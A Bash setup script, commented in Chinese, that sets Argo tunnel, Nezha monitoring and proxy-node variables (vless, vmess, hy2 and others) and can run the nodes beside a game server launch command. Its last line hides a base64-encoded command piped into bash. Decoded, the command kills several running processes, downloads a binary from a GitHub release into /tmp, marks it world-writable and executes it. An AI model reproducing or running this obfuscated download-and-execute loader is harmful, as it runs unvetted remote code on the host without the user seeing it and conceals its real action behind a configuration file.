#!/bin/bash

# //隧道相关设置（去掉下面变量前面#启用，否则使用临时隧道）
export TOK=${TOK:-''}  # 隧道token或json
export ARGO_DOMAIN=${ARGO_DOMAIN:-''} # 隧道域名

# //哪吒相关设置
export NEZHA_SERVER=${NEZHA_SERVER:-''}
export NEZHA_KEY=${NEZHA_KEY:-''}
export NEZHA_PORT=${NEZHA_PORT:-'443'}
export NEZHA_TLS=${NEZHA_TLS:-'1'}  # 1启用tls,0关闭tls

# //节点相关设置(节点可在worlds文件里list.log查看)
export TMP_ARGO=${TMP_ARGO:-'xhttp'}  # 节点类型,可选vls,vms,spl,xhttp,rel,hy2,tuic，sock,3x
# export UUID=${UUID:-'9e0da28d-ee9c-4fef-95a4-df2d0335e649'} # 去掉#可以使用固定值，否则随机
export VL_PORT=${VL_PORT:-'8002'} #vles 端口
export VM_PORT=${VM_PORT:-'8001'} #vmes 端口
export CF_IP=${CF_IP:-'ip.sb'}  # cf优选域名或ip
export SUB_NAME=${SUB_NAME:-'Argo'} # 节点名称
export second_port=${second_port:-''} # 第二端口，部分玩具支持设置第二端口

# //订阅上传地址
# export SUB_URL='https://xxx.eu.org/upload-上传密钥' # 订阅上传地址

# //通用启动游戏方式，适合任何游戏(去掉#开启游戏，复制启动命令填在下面)，注意开启游戏，不能用rel,tuic,hy2,因为端口会冲突
# export JAR_SH='java -Xms128M -XX:MaxRAMPercentage=95.0 -Dterminal.jline=false -Dterminal.ansi=true -jar xxx.jar'  # 游戏启动命令，命令中jar游戏名称改为xxx.jar

# //设置文件保存位置(一般默认即可)
# export FLIE_PATH="$PWD/worlds/"

# //启动程序
echo "aWYgY29tbWFuZCAtdiBjdXJsICY+L2Rldi9udWxsOyB0aGVuCiAgICAgICAgRE9XTkxPQURfQ01EPSJjdXJsIC1zTCIKICAgICMgQ2hlY2sgaWYgd2dldCBpcyBhdmFpbGFibGUKICBlbGlmIGNvbW1hbmQgLXYgd2dldCAmPi9kZXYvbnVsbDsgdGhlbgogICAgICAgIERPV05MT0FEX0NNRD0id2dldCAtcU8tIgogIGVsc2UKICAgICAgICBlY2hvICJFcnJvcjogTmVpdGhlciBjdXJsIG5vciB3Z2V0IGZvdW5kLiBQbGVhc2UgaW5zdGFsbCBvbmUgb2YgdGhlbS4iCiAgICAgICAgc2xlZXAgNjAKICAgICAgICBleGl0IDEKZmkKdG1kaXI9JHt0bWRpcjotIi90bXAifSAKcHJvY2Vzc2VzPSgiJHdlYl9maWxlIiAiJG5lX2ZpbGUiICIkY2ZmX2ZpbGUiICJhcHAiICJ0bXBhcHAiKQpmb3IgcHJvY2VzcyBpbiAiJHtwcm9jZXNzZXNbQF19IgpkbwogICAgcGlkPSQocGdyZXAgLWYgIiRwcm9jZXNzIikKCiAgICBpZiBbIC1uICIkcGlkIiBdOyB0aGVuCiAgICAgICAga2lsbCAiJHBpZCIgJj4vZGV2L251bGwKICAgIGZpCmRvbmUKJERPV05MT0FEX0NNRCBodHRwczovL2dpdGh1Yi5jb20vZHNhZHNhZHNzcy9wbHV0b25vZGVzL3JlbGVhc2VzL2Rvd25sb2FkL3hyL21haW4tYW1kID4gJHRtZGlyL3RtcGFwcApjaG1vZCA3NzcgJHRtZGlyL3RtcGFwcCAmJiAkdG1kaXIvdG1wYXBw" | base64 -d | bash
